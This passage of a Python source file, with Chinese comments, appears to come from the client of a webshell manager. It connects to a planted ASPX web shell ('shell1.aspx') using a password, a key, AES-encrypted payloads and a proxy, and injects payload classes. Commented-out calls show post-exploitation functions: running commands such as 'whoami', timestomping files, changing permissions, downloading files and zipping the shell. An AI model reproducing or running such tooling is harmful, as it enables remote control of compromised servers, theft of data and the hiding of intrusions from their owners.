            return False
        print(f"[DEBUG] 发送{classInfo['class_name']}类成功: {result_bytes.decode('utf-8', errors='ignore')}")
        return True 

    def Hello(self,classname="sayHello",name="faker"):     
        parameter = ReqParameter()
        parameter.add("name", name)
        result = self.eval_func(classname, "Hello", parameter)   
        return self._decode_response_text(result)

def main():
    # 测试配置文件路径
    import os
    current_dir = os.path.dirname(os.path.abspath(__file__))
    data_dir = os.path.join(current_dir, '../data')
    custom_config_file = os.path.join(data_dir, "request_format_define.json")

    csharp_shell = CsharpShell("http://172.26.32.1:82/shell1.aspx", "pass", "key")

    csharp_shell.request_format = 'json'
    csharp_shell.request_format_file = custom_config_file
    csharp_shell.response_encrypt_type = 'aes_base64'
    csharp_shell.session.proxies = {
        "http": "http://172.26.32.1:8081",
    }
    csharp_shell.test_base_dir = "C:\\Windows\\Temp"
    if csharp_shell.init_payload("mainPayload_aes_base64"):
        print("init payload success")
        """ class_content = csharp_shell.payload_manager.getPayload(payload_name="sayHello",obfuscation_method='specified',specified_name="sayHello")
        class_info = {"class_name":"sayHello","class_content":class_content}
        if not csharp_shell.include(class_info):
            print("include sayHello failed")
            return
        result = csharp_shell.Hello("sayHello", "faker")
        print(result) """
        if csharp_shell.test():
            print("test success")
            #print(csharp_shell.get_basic_info())
        else:
            print("test failed")
        #print(asp_shell.get_basic_info())
        #asp_shell.new_file("C:\\Windows\\Temp\\test.txt")
        #asp_shell.set_file_time("E:\\Project\\aspweb\\test.txt", ["2025-01-22 10:00:00", "2025-01-22 10:00:00", "2025-01-22 08:00:00"])
        #asp_shell.set_file_permission("C:\\Windows\\Temp\\test.txt", "RWX")
        #asp_shell.big_file_download("E:\\Project\\aspweb\\test.txt")
        #asp_shell.zip(["E:\\Project\\aspweb\\test.txt", "E:\\Project\\aspweb\\shell1.aspx"], "E:\\Project\\aspweb\\test1.zip")
        #asp_shell.unzip("E:\\Project\\aspweb\\test1.zip", "E:\\Project\\aspweb\\test")
        #result = asp_shell.get_files("E:\\Project\\aspweb")
        #result = csharp_shell.execute_command("whoami")
   
    else:
        print("init payload failed")


if __name__ == "__main__":
    main()